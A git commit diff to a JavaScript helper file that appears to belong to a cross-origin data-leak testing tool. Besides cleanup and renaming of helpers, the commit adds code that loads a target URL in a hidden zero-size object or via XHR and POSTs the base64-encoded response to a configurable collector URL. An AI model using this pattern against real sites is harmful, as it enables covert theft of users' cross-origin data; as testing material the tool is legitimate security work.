a8961d2c316d398e76500cf79f241c81f1eba0a2
Aayla Secura <aayla.secura.1138@gmail.com>
2019-01-13 19:10:16 +1300

    New method via canvas + sending data back to server
    Old getData renamed to getDataViaXHR
    Added getDataViaCanvas to fetch as an object (type svg at the moment)
    Now POSTing the fetched data back to the server for better logging
    
    Minor cleanup:
    - Added missing var before some declarations
    - Removed unused (and confusing) declaration of ifr inside the ifr
      onload handler (what have I been I thinking...)
    - Removed commented out old jQuery code
    - Defined registerOnLoad for an element's onload handler
    - Renamed registerOnReady to registerWinOnLoad
    - Renamed createElement to addElement

--- js/allfuncs.js
+++ js/allfuncs.js
@@ -19,14 +19,7 @@ if (Object.defineProperty
   })();
 }
 
-function registerOnReady(func) {
-	// logToConsole('registerOnReady');
-	// Not working in Opera 11.52
-	// $(document).ready(function () {
-	// 	func();
-	// 	logToConsole('ready')
-	// });
-
+function registerWinOnLoad(func) {
 	// Not working in Opera 11.52
 	// document.addEventListener("DOMContentLoaded", function (event) {
 	// 	logToConsole('DOM loaded')
@@ -56,18 +49,35 @@ function registerOnReady(func) {
 	};
 };
 
-function createElement(tag, attr, appendTo) {
-	if (typeof appendTo === 'undefined') {
-		appendTo = document.body;
+function registerOnLoad(obj, func) {
+	if(obj.attachEvent) { // IE
+		obj.attachEvent('onload', func);
+	} else {
+		obj.onload = func;
 	}
-	el = document.createElement(tag);
-	for (prop in attr) {
+};
+
+function addElement(tag, attr, appendTo) {
+	var el = document.createElement(tag);
+	for (var prop in attr) {
 		if (attr.hasOwnProperty(prop)) {
 			el.setAttribute(prop, attr[prop]);
 		}
 	}
+	if (typeof appendTo === 'undefined') {
+		appendTo = document.body;
+	}
 	appendTo.appendChild(el);
 	return el;
+};
+
+function getPar(parname) {
+	var pars = document.location.search.slice(1).split('&');
+	for (var i = 0; i < pars.length; i++){
+		if (pars[i].substr(0, parname.length + 1) === parname + '=') {
+			return pars[i].slice(parname.length + 1);
+		}
+	}
 };
 
 function logToPage(msg, msgStyle, divStyle, logId, quiet) {
@@ -80,12 +90,9 @@ function logToPage(msg, msgStyle, divStyle, logId, quiet) {
 	if (typeof divStyle === 'undefined') {
 		divStyle = '';
 	}
-	// var log = $('#' + logId);
 	var log = document.getElementById(logId);
-	// if (log.length === 0) {
 	if (log === null) {
-		// log = $('<div></div>', {id: logId, style: divStyle}).appendTo('body');
-		log = createElement('div', {id: logId, style: divStyle})
+		log = addElement('div', {id: logId, style: divStyle})
 
 		if (typeof quiet === 'undefined' || ! quiet) {
 			logToConsole('Created log div');
@@ -94,17 +101,14 @@ function logToPage(msg, msgStyle, divStyle, logId, quiet) {
 	else if (typeof quiet === 'undefined' || ! quiet) {
 		logToConsole('Using old log div');
 	}
-	// newlog = $('<p>', {style: 'margin-top: 0px; margin-bottom: 0px; ' + msgStyle});
-	newlog = createElement('p', {style: 'margin-top: 0px; margin-bottom: 0px; ' + msgStyle});
-	// newlog.text(msg);
+	var newlog = addElement('p', {style: 'margin-top: 0px; margin-bottom: 0px; ' + msgStyle});
 	newlog.textContent = msg;
-	// log.append(newlog)
 	log.appendChild(newlog)
 };
 
 function logToConsole(msg) {
 	if (typeof DEBUG === 'undefined' || ! DEBUG) { return; }
-	// There's no console in Opera 10.10
+	// There's no console in Opera 10.10 and IE
 	// if (typeof console === 'undefined') {
 		window.top.logToPage('[' + document.location.search + ']: ' + msg, '',
 			'font-family: monospace; color: white; background-color: red;', 'errLog', true)
@@ -115,10 +119,32 @@ function logToConsole(msg) {
 };
 
 function getData(reqURL, doPOST, sendURL, force_preflight) {
+	getDataViaXHR(reqURL, sendURL, doPOST, force_preflight);
+	if (! doPOST) {
+		getDataViaCanvas(reqURL, sendURL);
+	}
+};
+
+function getDataViaCanvas(reqURL, sendURL) {
+	var hidden = 'visibility: hidden; width: 0; height: 0; border: 0; border: none;';
+	var img = addElement('object', {data: reqURL, crossOrigin: 'Anonymous',
+		type: 'image/svg+xml', style: hidden});
+	registerOnLoad(img, function () {
+		// the onload handler of <object> fires too soon so we call it from setTimeout
+		// IE11 doesn't support arrow functions, so we need to use bind
+		sendDataLater = (function () {
+			if (this.contentDocument) {
+				sendData(this.contentDocument.body.childNodes[0].innerHTML, sendURL);
+			} }).bind(this);
+		setTimeout(sendDataLater, 2000);
+	});
+};
+
+function getDataViaXHR(reqURL, sendURL, doPOST, force_preflight) {
 	var req = new XMLHttpRequest();
 	if (doPOST) {
 		logToPage('POSTing to ' + reqURL);
-		req.open('POST',reqURL);
+		req.open('POST', reqURL);
 		req.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
 	} else {
 		logToPage('GETting ' + reqURL);
@@ -131,12 +157,7 @@ function getData(reqURL, doPOST, sendURL, force_preflight) {
 	req.onreadystatechange = function reqListener(){
 		if (this.readyState != 4) { return; }
 		logToPage(this.responseText, 'color: red; font-weight: bold');
-		if (sendURL) {
-			// not tested with old browsers
-			var exf = new XMLHttpRequest();
-			exf.open('GET', sendURL+'/?STATUS='+this.status+'?CONTENT='+btoa(escape(this.responseText)));
-			exf.send();
-		}
+		sendData(this.responseText, sendURL);
 	};
 	if (doPOST) {
 		req.send("{}"); // old browsers don't support JSON
@@ -145,11 +166,10 @@ function getData(reqURL, doPOST, sendURL, force_preflight) {
 	}
 };
 
-function getPar(parname) {
-	pars = document.location.search.slice(1).split('&');
-	for (i = 0; i < pars.length; i++){
-		if (pars[i].substr(0, parname.length + 1) === parname + '=') {
-			return pars[i].slice(parname.length + 1);
-		}
-	}
+function sendData(data, sendURL) {
+	if (! data || ! sendURL) { return; }
+	var exf = new XMLHttpRequest();
+	exf.open('POST', sendURL);
+	exf.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+	exf.send('{data:"' + btoa(escape(data)) + '"}');
 };
